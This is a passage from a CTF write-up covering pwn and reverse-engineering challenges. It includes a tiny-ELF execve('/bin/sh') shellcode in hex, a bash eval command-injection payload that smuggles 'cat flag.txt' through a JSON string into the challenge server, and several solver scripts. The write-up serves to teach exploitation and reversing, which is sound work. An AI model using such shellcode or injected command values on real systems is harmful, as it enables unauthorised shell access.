By picking `useless` field in `Elf64_Ehdr` carefully, we can place part of shellcode in it. 

Further more, we can take a deeper look at segment header. The detailed answer is in `glibc/elf/dl-load.c`. Here is the conclusion.

```C

// PT_LOAD
typedef struct
{
  Elf64_Word    p_type;         /* Hardcodz */
  Elf64_Word    p_flags;        /* lower 3 bits useful, remain bits are useless */
  Elf64_Off p_offset;       /* useful */
  Elf64_Addr    p_vaddr;        /* useful */
  Elf64_Addr    p_paddr;        /* useless */
  Elf64_Xword   p_filesz;       /* it should be larger than real file size, higher bits are useless */
  Elf64_Xword   p_memsz;        /* useful */
  Elf64_Xword   p_align;        /* lower 12 bits shoule be zero, remain bits are useless */
} Elf64_Phdr;

// PT_DYNAMIC
typedef struct
{
  Elf64_Word    p_type;         /* Hardcodz */
  Elf64_Word    p_flags;        /* useless */
  Elf64_Off p_offset;       /* useless */
  Elf64_Addr    p_vaddr;        /* useful */
  Elf64_Addr    p_paddr;        /* useless */
  Elf64_Xword   p_filesz;       /* useless */
  Elf64_Xword   p_memsz;        /* useful */
  Elf64_Xword   p_align;        /* useless */
} Elf64_Phdr;

```



However, one shortage of above shellcode is that, `movabs` instruction has 10 bytes. It's too long. The server is 18.04, which means we can use fixed offset to get `/bin/sh` in libc. So shellcode is changed to the following one. 
```
   0:   6a 3b                   push   0x3b
   2:   58                      pop    rax
   3:   99                      cdq
   4:   52                      push   rdx
   5:   48 8d 3d 3f 8e ba ff    lea    rdi,[rip+0xffffffffffba8e3f]        # 0xffffffffffba8e4b
   c:   52                      push   rdx
   d:   57                      push   rdi
   e:   54                      push   rsp
   f:   5e                      pop    rsi
  10:   0f 05                   syscall
```

Now it's easy to break it into several parts, and connecting with 2 bytes short jmp.

For saving more bytes, we have to do some overlapping jobs. In the final version, Dynamic segment and text segment are whole-overlapped into segment header.

The final submitted version is here:

```
7f454c4602010100000000000000000003003e000100000002000000a0a0a0a0180000000000000058000000000000006a3b5899eb043800020052488d3d58eeb9ff5257545e0f05a0a0a0a0a0a0a0a00100000007a0a0a0050000000000000005000000000000000c000000000000003000000000000000060000000000000000a0a0a0a0a0a0a0
```

### json bourne
The scripts are used for pretty print the json string with different colors according to the type. The type can be number, string, array and objects. If the pattern "task " exists in a string. The color will be choose and override by the number after the string "task " in this line script.
```
if [[ "$((suffix > 0))" = "1" && "$((suffix <= 8))" = "1" ]]; then

```
The content in variable "suffix" comes from user input and environment variable can be used.
```
nc json.bourne.pwni.ng 1337 
"task PWD"
./parser.sh: line 20: /problem/jb: syntax error: operand expected (error token is "/problem/jb")
```
We can also override the environment variable "_var_name_i" by "task _var_name_i=19".
An input example and parsed result can be as follow:
```
_var_name_i=33
input='[1,2,3,{"abc":"def"],"ABC",[1]]'
result=([_type]="var_9" [0]="var_10" [1]="var_12" [2]="var_14" [3]="var_16" [4]="var_25" [5]="var_26" [6]="var_27" [7]="var_29" [8]="var_30" )
var_10=([_type]="var_11" [0]="1" )
var_11=NUMBER
var_12=([_type]="var_13" [0]="2" )
var_13=NUMBER
var_14=([_type]="var_15" [0]="3" )
var_15=NUMBER
var_16=([_type]="var_17" [var_18]="var_19" )
var_17=OBJECT
var_18=([_type]="var_20" [0]="abc" )
var_19=([_type]="var_21" [0]="def" )
var_20=STRING
var_21=STRING
var_22=([_type]="var_24" )
var_24=STRING
var_27=([_type]="var_28" [0]=",[1]]" )
var_28=STRING
var_30=([_type]="var_31" [0]="var_32" )
var_31=ARRAY
var_32=([_type]="var_33" [0]="1" )
var_33=NUMBER
var_9=ARRAY
```
We overrided  _var_name_i  to 19, then var_20, var_21 and the following var_xx can be override in the later process of parsing.
So the type of string "def" will be change to ARRAY and "def" will be consider as a variable name of the item in the fake array.
```
_var_name_i=23
input='[1,2,3,{"abc":"PWD};cat flag.txt;"},"task _var_name_i=19",[1]]'
result=([_type]="var_9" [0]="var_10" [1]="var_12" [2]="var_14" [3]="var_16" [4]="var_22" [5]="var_20" )
var_10=([_type]="var_11" [0]="1" )
var_11=NUMBER
var_12=([_type]="var_13" [0]="2" )
var_13=NUMBER
var_14=([_type]="var_15" [0]="3" )
var_15=NUMBER
var_16=([_type]="var_17" [var_18]="var_19" )
var_17=OBJECT
var_18=([_type]="var_20" [0]="abc" )
var_19=([_type]="var_21" [0]="PWD};cat flag.txt;" )
var_20=([_type]="var_21" [0]="var_22" )
var_21=ARRAY
var_22=([_type]="var_23" [0]="1" )
var_23=NUMBER
```
When print() this item,  shell command injection triggers here.
```
eval 'kind_key=${'$1'["_type"]}'
```
Finally
```
nc json.bourne.pwni.ng 1337
[1,2,3,{"abc":"PWD};cat flag.txt;"},"task _var_name_i=19",[1]]
PCTF{the_bourne_identity_crisis}
./pprint.sh: line 120: [_type]}: command not found
[
  1,
  2,
  3,
  {
    "abc": [
      
    ]
  },
  1,
  [
    1
  ]
]

```



## Reverse

### You wa shockwave
After googleing about dcr file format, we find <https://github.com/eriksoe/Schockabsorber/tree/master/shockabsorber/loader>. Patch it to make it executable, then we can get something interesting:
```
DB| * handler_name = 'zz_helper' (0x380)
DB|   subsections = [(276, 107), (384, 3), (390, 3), (396, 0), (396, 11)]
DB|   handler extras = [12, 1, 4]
DB| * handler_name = 'zz' (0x36a)
DB|   subsections = [(408, 22), (430, 1), (432, 0), (432, 0), (432, 1)]
DB|   handler extras = [204, 15, 4]
DB| * handler_name = 'check_flag' (0x372)
DB|   subsections = [(434, 789), (1224, 1), (1226, 9), (1244, 0), (1244, 27)]
DB|   handler extras = [254, 19, 25]
DB| * handler_name = 'click' (0x1b0)
DB|   subsections = [(1272, 57), (1330, 0), (1330, 1), (1332, 0), (1332, 8)]
DB|   handler extras = [1457, 48, 2]
DB| handler zz_helper: 
...
```

Read the opcode with guessing, so it's something like:

```
def check_flag(flag):
	if flag.length != 42:
		return
	checksum = 0
	for (i=1; i<=21; ++i) 
		checksum ^= zz(charToNum(flag[i*2])+256*charToNum(flag[i*2-1]))
	if checksum != 5803878:
		return
	check_data[20][5] = [[      2,       5,      12,      19, 3749774],
 [      2,       9,      12,      17,  694990],
 [      1,       3,       4,      13,    5764],
 [      5,       7,      11,      12,  299886],
 [      4,       5,      13,      14, 5713094],
 [      0,       6,       8,      14,  430088],
 [      7,       9,      10,      17, 3676754],
 [      0,      11,      16,      17, 7288576],
 [      5,       9,      10,      12, 5569582],
 [      7,      12,      14,      20, 7883270],
 [      0,       2,       6,      18, 5277110],
 [      3,       8,      12,      14,  437608],
 [      4,       7,      12,      16, 3184334],
 [      3,      12,      13,      20, 2821934],
 [      3,       5,      14,      16, 5306888],
 [      4,      13,      16,      18, 5634450],
 [     11,      14,      17,      18, 6221894],
 [      1,       4,       9,      18, 5290664],
 [      2,       9,      13,      15, 6404568],
 [      2,       5,       9,      12, 3390622]]
	x = check_data[1]
	i = x[1]
	j = x[2]
	k = x[3]
	l = x[4]
	target = x[5]
	sum = zz(charToNum(flag[i*2+1])*256+charToNum(flag[i*2+2]))
	sum ^= zz(charToNum(flag[j*2+1])*256+charToNum(flag[j*2+2]))
	sum ^= zz(charToNum(flag[k*2+1])*256+charToNum(flag[k*2+2]))
	sum ^= zz(charToNum(flag[l*2+1])*256+charToNum(flag[l*2+2]))
	if sum != target:
		return 
		
def zz(x):
  return zz_helper(1,1,x)[0]
      
def zz_helper(x,y,z):
  if y<=z:
    c = zz_helper(y, x+y, z)
    a = c[0]
    b = c[1]
    if b >= x:
      return [a*2+1,b-x]
    else:
      return [a*2, b]
  else:
    return [1,z-x]
```

Use z3 to solve it:

```python
# ipython history
from z3 import *
s = Solver()
a = [[      2,       5,      12,      19, 3749774],   
 [      2,       9,      12,      17,  694990],       
 [      1,       3,       4,      13,    5764],       
 [      5,       7,      11,      12,  299886],       
 [      4,       5,      13,      14, 5713094],       
 [      0,       6,       8,      14,  430088],       
 [      7,       9,      10,      17, 3676754],       
 [      0,      11,      16,      17, 7288576],       
 [      5,       9,      10,      12, 5569582],       
 [      7,      12,      14,      20, 7883270],       
 [      0,       2,       6,      18, 5277110],       
 [      3,       8,      12,      14,  437608],       
 [      4,       7,      12,      16, 3184334],       
 [      3,      12,      13,      20, 2821934],               
 [      3,       5,      14,      16, 5306888],               
 [      4,      13,      16,      18, 5634450],               
 [     11,      14,      17,      18, 6221894],               
 [      1,       4,       9,      18, 5290664],               
 [      2,       9,      13,      15, 6404568],               
 [      2,       5,       9,      12, 3390622]]               
for aa in a:                                                  
    s.add(x[aa[0]] ^ x[aa[1]] ^ x[aa[2]] ^ x[aa[3]]  == aa[4])
s.add(reduce(lambda x,y:x^y, x)==5803878)                     
s.check()                                                     
m = s.model()                                                 
m                                                             
afterzz = [m[x[i]] for i range(21)]                           
afterzz = [m[x[i]] for i in range(21)]                        
afterzz                                                       
type(afterzz[0])                                              
afterzz = [m[x[i]].as_long() for i in range(21)]              
afterzz                                                       
def zz(x):                                                    
  return zz_helper(1,1,x)[0]                                  
                                                              
def zz_helper(x,y,z):                                         
  if y<=z:                                                    
    c = zz_helper(y, x+y, z)                                  
    a = c[0]                                                  
    b = c[1]                                                  
    if b >= x:                                                
      return [a*2+1,b-x]                                      
    else:                                                     
      return [a*2, b]                                         
  else:                                                       
    return [1,z-x]                                            
table = [zz(i) for i in range(0x10000)]                       
[table.index(i) for i in afterzz]                             
f = [table.index(i) for i in afterzz]                         
[u16(i) for i in f]                                           
[p16(i) for i in f]                                           
[p16(i,endian='big') for i in f]                              
''.join([p16(i,endian='big') for i in f])                     
```

### reee

there are fixed rounds which decrypt the hidden code in .text section, we can first dump the code in gdb. the decrypted code is obfuscated with some wont-take jumps, which jumps to the middle of some other instructions, and some jumps jump to the middle of the jump instruction itself. we check every redundant jumps and patch them out.

the main logic is pretty straightforward, 1337 rounds of byte-by-byte xor starting with 80. and compare with a fixed result.

![](https://hackmd.sinku.me/uploads/upload_dc7cff5d44dca460be7e2be58e2185b1.png)

the entire sequence is determined by starting xor key, so we enumerate all possible bytes for the last byte in last round and reverse the encryption, if the resulting starting xor key is 80, we will have the flag in first round.

```python
cipher = '\x48\x5F\x36\x35\x35\x25\x14\x2C\x1D\x01\x03\x2D\x0C\x6F\x35\x61\x7E\x34\x0A\x44\x24\x2C\x4A\x46\x19\x59\x5B\x0E\x78\x74\x29\x13\x2C'
cipher = map(ord, cipher)
plain = ''
xorkey = 80

def guess(n, cipher):
    xorkey = n
    cipher = list(cipher)
    lastround = list(cipher)
    lastround[-1] = xorkey
    for i in xrange(1337):
        for j in xrange(len(cipher) - 2, -1, -1):
            lastround[j] = cipher[j + 1] ^ lastround[j + 1]
        xorkey = cipher[0] ^ lastround[0]
        cipher = lastround
        lastround = list(cipher)
        lastround[-1] = xorkey
    return xorkey, cipher

for i in xrange(256):
    key, cipher1 = guess(i, cipher)
    if key == xorkey:
        print 'ok', i, ''.join(map(chr, cipher1))
        break
```

### the watness 2

we are provided with a hypercard game, and we shall play 3 puzzles and get the flag. the puzzles have hidden logic to check which need reversing. there are 3 contraints, which yield 3 puzzles, there are also 2 functions in the hypercard, watnesssolver and decoder, the first one check if the path satisfy the constraint and second one will produce part of flag with path and key. the functions are m68k binaries, we need to reverse the logic.

we can get the constraint and the key by listing the strings in the binary. the constraint is the initial state of a Game of Life map, there are RGB blocks and they will change under some rules, the player starts at left up cornor, and should make his way to right down cornor, and should always have a RED block along the edge it moves. since the map is fixed envolved, we can emulate the changes and DFS a path to the end.

```cpp
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>

// const char* map_data = "rbrr rg"
// "b rb  r"
// " brgrbr"
// "gb  grr"
// "gbbg gr"
// "g bgrg "
// " bbgrbg";

// const char* map_data =  "rbr  bb"
// "ggrgrgg"
// "b   bgg"
// "bb b  b"
// " bbrbbg"
// "g gbrrb"
// "grbbb g";

const char* map_data =   "rrbrb r"
"g g  bg"
"rbgggr "
"ggrgr g"
"r rg br"
"r  b  b"
"ggrbgbb";



int ISRED(short *colormap, short x, short y){
    return colormap[x*7+y] == 'R';
}

short getneighbors(short color,short x,short y,short* map){
	// 计算上下左右四个点同色的个数
	// short buffer[0x18];
	// memcpy(buffer,map,0x30);
	short cnt = 0;
	for(short i=-1;i<=1;i++){
		for(short j=-1;j<=1;j++){
			short tmp;
			tmp = (i != 0) | (j != 0);
			tmp &= (y + i) >= 0;
			tmp &= (x + j) >= 0;
			tmp &= (y + i) < 7;
			tmp &= (x + j) < 7;
			short val = map[(x + j) * 7 + y + i];
			tmp &= color == val;
			if(tmp)
				cnt +=1;
		}
	}
    return cnt;
}



short CHOOSERED(short b,short g,short r) {
    if (r != 2 && r != 3) {
        return 0;
    } else if (b == 0 || g == 0) {
        return 0;
    } else {
        return 1;
    }
}

short CHOOSEGREEN(short b,short g,short r) {
    if (r > 4) {
        return 0;
    } else if (b > 4){
        return 3;
    } else if (r == 2 || r == 3){
        return 1;
    } else {
        return 2;
    }
}

short CHOOSEBLUE(short b,short g,short r) {
    if (r > 4) {
        return 0;
    } else if (g > 4) {
        return 2;
    } else if (r == 2 || r == 3) {
        return 1;
    } else {
        return 3;
    }
}

short CHOOSEEMPTY(short b,short g,short r) {
	if ((b == 0) && (g == 0)){
		return 0;
	}else{
		if(b < g){
			return 2;
		}else{
			return 3;
		}
	}
}

void stepaumaton(short *map) {
	short buffer[49];
	memcpy(buffer,map,sizeof(buffer));

	for(int i=0;i<7;i++){//row
		for(int j=0;j<7;j++){//column
			short r = getneighbors(1,i,j,buffer);
			short g = getneighbors(2,i,j,buffer);
			short b = getneighbors(3,i,j,buffer);
			short e = getneighbors(0,i,j,buffer);
			// printf("(%d,%d) r:%d g:%d b:%d e:%d\n",i,j,r,g,b,e);
			switch(buffer[i*7+j]){
				case 1:
					map[i*7+j] = CHOOSERED(b, g, r);
					break;
				case 2:
					map[i*7+j] = CHOOSEGREEN(b, g, r);
					break;
				case 3:
					map[i*7+j] = CHOOSEBLUE(b, g, r);
					break;
				case 0:
					map[i*7+j] = CHOOSEEMPTY(b, g, r);
					break;
				default:
					assert(0);
			}
		}
	}
}


void show_map(short *map){
	puts("");
	for(int i=0;i<7;i++){
		putchar(' ');
		for(int j=0;j<7;j++){
			short c = map[i*7+j];
			switch(c){
			case 0:
				printf("X ");
				break;
			case 1:
				printf("r ");
				break;
			case 2:
				printf("g ");
				break;
			case 3:
				printf("b ");
				break;
			default:
				printf("%d\n",c);
				break;
			}
		}
		puts("               ");
		puts("");
	}
}

short* map_pool[24];
short record[7][7];

void show_sv(char *sv, int len)
{
    int x = 0, y = 0;
    int k;
    int i, j;
    for (k = 0; k < len; k++)
    {
        printf("%d: %c\n", k, sv[k]);
        for (i = 0; i < 8; i++)
        {
            for (j = 0; j < 8; j++)
            {
                if (j == x && i == y)
                {
                    putchar('X');
                }
                else
                {
                    putchar('+');
                }
                if (j != 7)
                {
                    printf("--");
                }
            }
            putchar('\n');
            if (i != 7)
            {
                for (j = 0; j < 8; j++)
                {
                    putchar('|');
                    if (j != 7)
                    {
                        /* switch (map_pool[k][i * 7 + j])
                        {
                        case 0:
                            printf("\e[1;40m  \e[m");
                            break;
                        case 1:
                            printf("\e[1;41m  \e[m");
                            break;
                        case 2:
                            printf("\e[1;42m  \e[m");
                            break;
                        case 3:
                            printf("\e[1;44m  \e[m");
                            break;
                        default:
                            exit(1);
                        }
*/
                        switch (map_pool[k][i * 7 + j])
                        {
                        case 0:
                            printf("  ");
                            break;
                        case 1:
                            printf("RR");
                            break;
                        case 2:
                            printf("GG");
                            break;
                        case 3:
                            printf("BB");
                            break;
                        default:
                            exit(1);
                        }
                    }
                }
                putchar('\n');
            }
        }
        puts("============================================");
        switch (sv[k])
        {
        case 'U':
            y -= 1;
            break;

        case 'R':
            x += 1;
            break;
        case 'D':
            y += 1;
            break;
        case 'L':
            x -= 1;
            break;
        }
    }
}

int up_ok(int row, int col, short *map)
{
    if (row == 0)
        return 0;
    if (record[row - 1][col])
        return 0;
    int good = 0;
    if (col != 0 && map[(row - 1) * 7 + col - 1] == 1)
    {
        good = 1;
    }
    if (map[(row - 1) * 7 + col] == 1)
    {
        good = 1;
    }
    return good;
}

int down_ok(int row, int col, short *map)
{
    if (row == 7)
        return 0;
    if (record[row + 1][col])
        return 0;
    int good = 0;
    if (col != 0 && map[row * 7 + col - 1] == 1)
    {
        good = 1;
    }
    if (map[row * 7 + col] == 1)
    {
        good = 1;
    }
    return good;
}
int left_ok(int row, int col, short *map)
{
    if (col == 0)
        return 0;
    if (record[row][col - 1])
        return 0;
    int good = 0;
    if (row != 0 && map[(row - 1) * 7 + col - 1] == 1)
    {
        good = 1;
    }
    if (map[row * 7 + col - 1] == 1)
    {
        good = 1;
    }
    return good;
}
int right_ok(int row, int col, short *map)
{
    if (col == 7)
        return 0;
    if (record[row][col + 1])
        return 0;
    int good = 0;
    if (row != 0 && map[(row - 1) * 7 + col] == 1)
    {
        good = 1;
    }
    if (map[row * 7 + col] == 1)
    {
        good = 1;
    }
    return good;
}

void dfs(int row, int col, int depth, char *path)
{

    record[row][col] = 1;
    if (row == 7 && col == 7 && depth >= 24)
    {
        path[depth] = '\0';
        printf("success\n");
        printf("path:%s\n", path);
        show_sv(path, depth);
        record[row][col] = 0;
        return;
    }
    short *cur_map = map_pool[depth];
    if (down_ok(row, col, cur_map))
    {
        path[depth] = 'D';
        dfs(row + 1, col, depth + 1, path);
    }
    if (right_ok(row, col, cur_map))
    {
        path[depth] = 'R';
        dfs(row, col + 1, depth + 1, path);
    }
    if (up_ok(row, col, cur_map))
    {
        path[depth] = 'U';
        dfs(row - 1, col, depth + 1, path);
    }
    if (left_ok(row, col, cur_map))
    {
        path[depth] = 'L';
        dfs(row, col - 1, depth + 1, path);
    }
    record[row][col] = 0;
}

int main(){
	short map[49];

	// BUILDAUTOMATON
	for(int i=0;i<7;i++){//row
		for(int j=0;j<7;j++){//column
			switch(map_data[i*7+j]){
				case ' ':
					map[i*7+j] = 0;
					break;
				case 'r':
					map[i*7+j] = 1;
					break;
				case 'g':
					map[i*7+j] = 2;
					break;
				case 'b':
					map[i*7+j] = 3;
					break;	
			}
		}
	}
	
	for(int step=0;step<24;step++){
		printf("%d:\n",step);
		// show_map(map);

		map_pool[step] = malloc(sizeof(map));
		memcpy(map_pool[step], map, sizeof(map));

		stepaumaton(map);
		// getchar();
		
	}
	char path[25] = {0};
	dfs(0,0,0,path);
}

```

and in decoder, the path is encoded to 48bit stream, the key is decoded by custom base32 to also 48bit stream. they xored and encoded by the same base32 to part of the flag. concat 3 part give you the flag

```python
from base64 import b32encode, b32decode
import argparse
from string import maketrans
from hexdump import hexdump

std_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
alphabet = "abcdefghijklmnopqrstuvwxyz{}_137"

keys = [
    'clrtffxpry',
    'nyghq7xksg',
    'ppyyvn}1{7',
]

real_paths = [
    'RDDDRURRRDLLDLDRRURRDDDR',
    'RDDRURDDDRURULURRDDDDDRD',
    'DRDDDDRUURRRULURRDDDDDDR',
]

def bindump(data):
    import sys
    print 'bindump:',
    for _ in data:
        sys.stdout.write(bin(ord(_))[2:].rjust(8, '0') + ' ')
    print

def base32decode(data):
    print '\nbase32decode'
    print data
    binseqs = map(lambda x: bin(alphabet.index(x))[2:].rjust(5, '0'), data)
    print binseqs

    binseq = ''.join(binseqs)[::-1]
    print binseq
    decodebin = []
    for i in xrange(len(binseq) % 8, len(binseq), 8):
        decodebin.append(binseq[i:i + 8])
    print decodebin
    decodebin = decodebin[::-1]
    decoded = ''.join(map(lambda x:chr(int(x, 2)), decodebin))
    bindump(decoded)
    return decoded

def base32encode(data):
    print '\nbase32encode'
    bindump(data)
    encodebin = map(lambda x: bin(ord(x))[2:].rjust(8, '0'), data)[::-1]
    print encodebin
    binseq = ''.join(encodebin)
    print binseq
    binseq = binseq.rjust(((len(binseq) + 4) / 5 * 5), '1')[::-1]
    print binseq

    binseqs = []
    for i in xrange(0, len(binseq), 5):
        binseqs.append(binseq[i:i + 5])
    print binseqs

    encoded = ''.join(map(lambda x: alphabet[int(x, 2)], binseqs))
    print encoded
    return encoded

def data_to_path(data):
    directions = {
        0b00: 'U',
        0b10: 'R',
        0b01: 'D',
        0b11: 'L'
    }
    path = ''
    for i in xrange(len(data)):
        cur = ord(data[i])
        path += directions[(cur & (0x3 << 0)) >> 0]
        path += directions[(cur & (0x3 << 2)) >> 2]
        path += directions[(cur & (0x3 << 4)) >> 4]
        path += directions[(cur & (0x3 << 6)) >> 6]
    return path

def path_to_data(path):
    print path
    directions = {
        'U': 0b00,
        'R': 0b10,
        'D': 0b01,
        'L': 0b11
    }
    data = ''
    for i in xrange(0, len(path), 4):
        cur = 0
        cur += directions[path[i + 0]] << 0
        cur += directions[path[i + 1]] << 2
        cur += directions[path[i + 2]] << 4
        cur += directions[path[i + 3]] << 6
        data += chr(cur)
    bindump(data)
    return data

def xor_string(a, b):
    result = ''
    for i in xrange(len(a)):
        result += chr(ord(a[i]) ^ ord(b[i]))
    return result

flag = ''
for i in xrange(3):
    path = real_paths[i]
    key = keys[i]
    unpacked_path = path_to_data(path)
    unpacked_key = base32decode(key)
    encflag = xor_string(unpacked_path, unpacked_key)
    flag += base32encode(encflag)
print flag
```



### That's a Lot of Fish
Reverse the typescript. First we found a bunch of codes with a big switch, which appears to be a vm after some manual reversing. Then we examined some types and found some bit operations and BST functions. After that we wrote a disassembler to translate the vm codes:
```python
l=[-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1, 1, 10, 1, 5, 8, 2, 5, 978, 1, 5, 7, 7, 1, 5, 7, 5, 0, 2, 1, 5, 1, 5, 8, 2, 5, 4, 1, 5, 7, 7, 5, 36, 2, 1, 5, 10, 8, 1, 0, 8, 1, 1, 0, 1, 5, 1, 7, 5, 978, 10, 228, 5,1, 5, 1,2, 5, 8,11, 0, 7, 1,1, 5, 1, 14, 724,1, 9, 5,1, 5, 1,2, 5, 4, 14, 724,14, 864,2, 2, 5,1, 5, 1, 14, 788,1, 9, 5,1, 5, 1,2, 5, 4, 14, 788, 14, 864,2, 2, 5,2, 1, 4, 9, 261880, 1, 1, 982, 1, 5, 2, 7, 1, 5,10, 8, 1,0, 4,1, 1, 4,12, 5, 9, 0,1, 13, 1,7, 13, 978, 10, 80, 13, 12, 9, 13, 0,7, 5, 9,10, 32, 5,1, 5, 9,2, 1, 4, 9, 262036,0, 12,0, 0,2, 5, 8,1, 5, 7,3, 5, 8,2, 5, 984,1, 5, 7,15,2, 5, 8,1, 5, 7,3, 5, 8,2, 5, 4,2, 5, 984,1, 5, 7,15,8, 5, 5,2, 5, 9,13, 5, 5,1, 9, 5,4, 9, 131072,7, 9, 0,10, 24, 9,8, 5, 5,13, 5, 5,15,16, 1136, 9, 218, 240, 218, 193, 238, 169, 202, 186, 208, 195, 137, 141, 128, 128, 90, 161, 199, 69, 249, 210, 162, 242, 67, 3, 79, 200, 90, 152, 82, 183, 253]
p=19
def par(x):
	flag = x & 3
	if flag == 0:
		return '%s' % str(x/4)
	if flag == 1:
		return 'r[%s]' % str(x/4)
	if flag == 2:
		return 'm[%s]' % str(x/4)
	if flag == 3:
		return 'm[r[%s]]' % str(x/4)

while p < 244:
	op = l[p]
	if op == 0:
		print "%d: exit %s" % ( p, par(l[p+1]) )
		p += 2
	if op == 1:
		print "%d: %s = %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 2:
		print "%d: %s += %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 3:
		print "%d: %s *= %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 4:
		print "%d: %s &= %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 5:
		print "%d: %s |= %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 6:
		print "%d: %s ^= %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 7:
		print "%d: cmp %s %s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 8:
		print "%d: %s = -%s" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 9:
		print "%d: jmp %s" % ( p, str(int(par(l[p+1]))+p+2-0x10000) )
		p += 2
	if op == 10:
		print "%d: jz %s %s" % ( p, str(int(par(l[p+1]))+p+3), par(l[p+2]) )
		p += 3
	if op == 11:
		print "%d: insert %s, %s, %s" % ( p, par(l[p+1]), par(l[p+2]), par(l[p+3]) )
		p += 4
	if op == 12:
		print "%d: get %s, %s, %s" % ( p, par(l[p+1]), par(l[p+2]), par(l[p+3]) )
		p += 4
	if op == 13:
		print "%d: %s = %s & 0xFFFF" % ( p, par(l[p+1]), par(l[p+2]) )
		p += 3
	if op == 14:
		print "%d: call %s" % ( p, par(l[p+1]) )
		p += 2
	if op == 15:
		print "%d: return" % ( p)
		p += 1
for i in range(244, len(l) ):
	print "%d: %d" % ( i, l[i] )
```
The vm codes appears to a shortest(guessed) Hamiltonian cycle problem, which can be solved through bruteforce(the graph can be calulated through the const array):
```
        0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15 
arr1=[  9,240,193,169,186,195,141,128,161, 69,210,242,  3,200,152,183]
arr2=[218,218,238,202,208,137,128, 90,199,249,162, 67, 79, 90, 82,253]

for i in range(0, 16):
	insert 0, m[i+2], i
	m[0] += abs(arr1[ input[i] ] - arr1[ input[i+1] ])
	m[0] += abs(arr2[ input[i] ] - arr2[ input[i+1] ])

135: m[0] != 1136
	exit 1
```

```cpp
#include <stdlib.h>
#include <iostream>
using namespace std;
int length=10000000;
const int n=16;
int path[n];
int graph[n][n];
int main()
{
	freopen("input.txt","r",stdin);
	unsigned beg,en;
	int passed[n]={0},min=0;
	
	int p[n];
	p[0]=0;
	passed[0]=1;
	int l=1,s=0;
	
	for(int i=0;i<n;i++)
	{
		for(int j=0;j<n;j++)
		{
			printf("%d %d\n",i,j);
			int a,b,c;
			scanf("%d %d %d\n", &a,&b,&c);
			graph[a][b]=c;
		}
	}
	
	for(int m=0;m<n;m++)
		for(int g=0;g<n;g++)
		{
			if(graph[m][g]!=0)
			if(graph[m][g]<min||min==0)
			min=graph[m][g];
			cout<<graph[m][g]<<'\t';
			if(g==n-1)
			cout<<endl;
		}
	cout<<endl<<min<<endl;
	
	for(int j=1;;j++)
	{
		if(j>n-1)
		{
			l--;
			if(l>0)
			{
				j=p[l];
				passed[j]=0;
				s-=graph[p[l-1]][j];
			}
			else
				break;
		}
		else if(passed[j]==0&&l<n)
		{
			p[l]=j;
			passed[j]=1;
			if(length<=(s+graph[p[l-1]][p[l]]+(n-l)*min))
			{
				j=p[l];
				passed[j]=0;
				continue;
			}
			s+=graph[p[l-1]][p[l]];
			j=0;
			l++;
		}		
		else if(l>=n)
		{
			l--;
			if((s+graph[p[l]][0])<length)
			{
				length=s+graph[p[l]][0];
				for(int i=0;i<n;i++)
				{
					path[i]=p[i];
				}
			}
			j=p[l];
			passed[j]=0;
			s-=graph[p[l-1]][j];
		}
	}
	cout<<endl<<"the shortest length is "<<length<<endl;
	for(int pp=0;pp<n;pp++)
	{
		cout<<path[pp]<<"->";
	}
	cout<<path[0]<<endl;
}
```
Run this to get the shortest path, translate it to binary and call Triplespine([[0,0,0,0],[1,0,0,1],[1,1,1,1],[0,1,0,0],[1,0,0,0],[0,0,1,0],[1,1,0,0],[0,0,0,1],[0,1,0,1],[1,0,1,0],[1,0,1,1],[1,1,0,1],[0,1,1,1],[0,1,1,0],[1,1,1,0],[0,0,1,1],[0,0,0,0]]) , then we got the flag.

### A Plaid Puzzle

By observing the rules we can know that there are 5 kinds of objects (let's call them X/Y/Z/chars/C). Two checker objects (True/False) belong to C. Chars are char0-char63. All objects in the 45\*45 matrix at the center belong to X. The objects in the rightmost column belong to Y. Z will appear after the game starts. The number of each kind of objects is 64. The rules can be concluded as follow:
1. The player can control the flag chars.
2. If nothing is under a object, the object will fall down.
3. If a char is under X, X will convert to Z according to table1
4. If Z is on the left of Y, Z will convert to Y' according to table2 and Y will disappear.
5. If a certain Y object is on the right of C, C will keep to be True, while all other Y objects will make C convert to False.

Table1 and table2 can be extracted from rules. We find that table2 is xor operation because a\^b\^b=a. Xor is actually addition on GF(2^n), so we guess that table1 is multiplication ob GF(2^6) because the number of objects are 64. After some calculating we know that the field is GF(2^6, modulus=x^6 + x^5 + x^4 + x + 1). So X/Y/Z/chars are different states of all 64 elements on the field.
Then we can know that in fact the game is calculating linear equations and checking the result. So we can get the flag by solving linear equations on GF(2^6). 













